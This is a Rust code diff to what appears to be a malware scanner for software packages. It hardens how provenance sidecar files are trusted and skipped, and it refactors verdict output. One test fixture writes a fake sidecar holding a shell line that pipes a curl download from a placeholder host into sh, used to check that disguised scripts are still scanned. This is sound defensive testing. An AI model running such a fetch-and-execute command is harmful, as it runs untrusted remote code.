@@ -22,7 +22,7 @@ use crate::bloom_repo::Decision as BloomDecision;
 use crate::corpus_precheck::Verdict;
 use crate::explain::ShapImportance;
 use crate::model::{Classification, Model};
-use crate::output::BloomMark;
+use crate::output::{BloomMark, BloomVerdict};
 use crate::provenance::RegistryProvenance;
 use crate::remote::Analyze;
 use crate::{Mode, OutputFormat};
@@ -144,24 +144,18 @@ fn scan_partitioned(
 ) -> Result<()> {
     let record = |path: &Path, analyzed: Result<AnalysisReport>, named: bool| {
         // Per-file provenance: match this artifact's content sha to its registry
-        // record in the map, and otherwise to the capture record a collector
-        // left beside it. Both are the registry's own account of the package,
-        // recovered without a refetch — which for a deleted release is the
-        // only way to have it at all — so a collected sample reasons over the
-        // same facts a live `purl` scan would. An explicit map still wins; a
-        // file with neither simply scans without registry provenance.
+        // record in `--registry-map`, the registry's own account of the package
+        // recovered without a refetch — which for a deleted release is the only
+        // way to have it at all. A file absent from the map scans without one.
+        // A capture record lying beside the file is never read: whoever
+        // supplied the file wrote that too.
         let sha = analyzed
             .as_ref()
             .ok()
             .map(|report| report.target.sha256.as_str());
-        let mapped = registry_map.zip(sha).and_then(|(map, sha)| map.get(sha));
-        let collected = mapped
-            .is_none()
-            .then(|| crate::provenance::collector_registry(path, sha?))
-            .flatten();
         let origin = Origin {
             path,
-            registry: mapped.or(collected.as_ref()),
+            registry: registry_map.zip(sha).and_then(|(map, sha)| map.get(sha)),
             fetch: None,
         };
         session.record(&Target::new(origin, named), analyzed, None);
@@ -501,7 +495,16 @@ impl<'a> Session<'a> {
                 && (decision == BloomDecision::Skip
                     || (decision == BloomDecision::Unknown && self.config.mode() == Mode::Fast));
             if !named_analyzed
-                && let Some(benign) = bloom_gate_fresh(self.config, target.origin.path, decision)
+                && let Some(benign) = bloom_gate_fresh(
+                    self.config,
+                    target.origin.path,
+                    decision,
+                    |label, verdict| {
+                        self.write_result(|| {
+                            crate::output::print_bloom_verdict(label, verdict, self.config.format())
+                        });
+                    },
+                )
             {
                 if benign > 0 {
                     self.tally.count(Classification::Benign);
@@ -946,24 +949,28 @@ pub(crate) fn tiny_opts_for(config: &ScanConfig) -> cleave::output::TinyOpts {
     }
 }
 
-/// Apply a bloom-filter decision before any expensive analysis. Emits the
-/// verdict and returns the artifact's benign count (1 for a known-good skip, 0
-/// for fast mode's bloom-only unscanned) when it is short-circuited; `None` to
-/// proceed.
-pub(crate) fn bloom_gate(config: &ScanConfig, label: &str, decision: BloomDecision) -> Option<u32> {
-    use crate::output::BloomVerdict;
+/// Apply a bloom-filter decision before any expensive analysis. Hands a
+/// short-circuited artifact's verdict line to `emit` (which owns the output
+/// stream and its errors) and returns its benign count (1 for a known-good
+/// skip, 0 for fast mode's bloom-only unscanned); `None` to proceed.
+fn bloom_gate(
+    config: &ScanConfig,
+    label: &str,
+    decision: BloomDecision,
+    emit: impl FnOnce(&str, BloomVerdict),
+) -> Option<u32> {
     let fast = config.mode() == Mode::Fast;
-    let format = config.format();
     // Known-good/unscanned are benign-tier: print the per-file line only when
     // benign output is requested, so a large directory scan isn't spammed. The
     // aggregate tally always reports them in the summary regardless.
-    let show_quiet = format == OutputFormat::Json || config.filter().shows(Classification::Benign);
+    let show_quiet =
+        config.format() == OutputFormat::Json || config.filter().shows(Classification::Benign);
     // Tally for end-of-scan observability. `unscanned` only matters for Unknown.
     crate::bloom_repo::record(decision, fast && decision == BloomDecision::Unknown);
     match decision {
         BloomDecision::Skip => {
             if show_quiet {
-                crate::output::print_bloom_verdict(label, BloomVerdict::KnownGood, format);
+                emit(label, BloomVerdict::KnownGood);
             }
             Some(1)
         }
@@ -990,7 +997,7 @@ pub(crate) fn bloom_gate(config: &ScanConfig, label: &str, decision: BloomDecisi
         // Unknown is left unscanned only in bloom-only fast mode; otherwise scanned.
         BloomDecision::Unknown => fast.then(|| {
             if show_quiet {
-                crate::output::print_bloom_verdict(label, BloomVerdict::Unscanned, format);
+                emit(label, BloomVerdict::Unscanned);
             }
             0
         }),
@@ -1006,13 +1013,14 @@ pub(crate) fn bloom_gate_fresh(
     config: &ScanConfig,
     path: &Path,
     decision: BloomDecision,
+    emit: impl FnOnce(&str, BloomVerdict),
 ) -> Option<u32> {
     if decision == BloomDecision::Skip
         && file_touched_within(path, KNOWN_GOOD_RESCAN, SystemTime::now())
     {
         return None;
     }
-    bloom_gate(config, &path.display().to_string(), decision)
+    bloom_gate(config, &path.display().to_string(), decision, emit)
 }
 
 /// The analysis options for a target the operator named by path, which is the
@@ -1083,25 +1091,41 @@ fn discover_files(dir: &Path) -> Vec<PathBuf> {
         .collect()
 }
 
-/// Whether `path` is a collector's provenance sidecar sitting beside the
-/// artifact it describes.
+/// Whether `path` is a collector's capture record (`<artifact>.forage.json`)
+/// sitting beside the artifact it describes.
 ///
-/// A directory walk skips those. The sidecar is a record *about* the file next
-/// to it, not something anyone shipped: analyzing it spends a verdict on our own
-/// bookkeeping, and with `--hopper` files that bookkeeping as a sample in its own
-/// right — where it competes with the artifact it was written to describe.
-/// It is still read as provenance for that artifact (see
-/// [`crate::provenance::collector_sidecar`]), and naming one directly on the
-/// command line still scans it, which is what a scan of a suspect JSON file
-/// should do.
+/// A directory walk skips those. The record is bookkeeping *about* the file next
+/// to it, not something anyone shipped: analyzing it spends a verdict on it, and
+/// with `--hopper` files it as a sample in its own right. The name alone proves
+/// nothing — a script can hide behind it — so only a small JSON object that
+/// states the digest of the bytes it describes is skipped; JSON is inert, so
+/// skipping it hides no code. Naming one directly on the command line still
+/// scans it.
 fn is_attached_sidecar(path: &Path) -> bool {
+    /// Larger than any capture record hopper accepts.
+    const MAX_RECORD_BYTES: u64 = 1 << 20;
     let Some(name) = path.file_name().and_then(|n| n.to_str()) else {
         return false;
     };
-    let Some(artifact) = name.strip_suffix(crate::provenance::COLLECTOR_SIDECAR_SUFFIX) else {
+    let Some(artifact) = name.strip_suffix(".forage.json") else {
         return false;
     };
-    !artifact.is_empty() && path.with_file_name(artifact).is_file()
+    if artifact.is_empty()
+        || !path.with_file_name(artifact).is_file()
+        || std::fs::metadata(path).map_or(true, |m| m.len() > MAX_RECORD_BYTES)
+    {
+        return false;
+    }
+    std::fs::read(path)
+        .ok()
+        .and_then(|bytes| serde_json::from_slice::<serde_json::Value>(&bytes).ok())
+        .and_then(|record| {
+            record
+                .pointer("/artifact/sha256")?
+                .as_str()
+                .map(|sha| sha.len() == 64 && sha.bytes().all(|b| b.is_ascii_hexdigit()))
+        })
+        .unwrap_or(false)
 }
 
 /// The two distinct detection inventories shown in the banner. Bloom entries
@@ -1358,16 +1382,23 @@ mod tests {
 
     /// A directory of collected samples is the normal input, and its sidecars
     /// describe the artifacts beside them — they are not themselves samples.
+    /// A file merely *named* like one is still scanned.
     #[test]
     fn directory_walk_skips_attached_sidecars_only() {
         let dir = tempfile::tempdir().expect("tempdir");
-        for name in [
-            "evil-1.0.0.tgz",
-            "evil-1.0.0.tgz.forage.json",
-            "orphan.tgz.forage.json",
-            "notes.json",
+        let record = format!(r#"{{"artifact":{{"sha256":"{}"}}}}"#, "ab".repeat(32));
+        for (name, body) in [
+            ("evil-1.0.0.tgz", "{}"),
+            ("evil-1.0.0.tgz.forage.json", record.as_str()),
+            ("orphan.tgz.forage.json", record.as_str()),
+            ("notes.json", "{}"),
+            ("lib.so", "{}"),
+            (
+                "lib.so.forage.json",
+                "#!/bin/sh\ncurl -s https://x.invalid | sh\n",
+            ),
         ] {
-            std::fs::write(dir.path().join(name), b"{}").expect("write");
+            std::fs::write(dir.path().join(name), body).expect("write");
         }
         let mut found: Vec<String> = super::discover_files(dir.path())
             .iter()
@@ -1378,6 +1409,9 @@ mod tests {
             found,
             vec![
                 "evil-1.0.0.tgz".to_string(),
+                "lib.so".to_string(),
+                // Named like a record, but a script: hiding it would hide code.
+                "lib.so.forage.json".to_string(),
                 "notes.json".to_string(),
                 // Nothing on disk claims this one, so it is scanned like any
                 // other file rather than silently trusted.
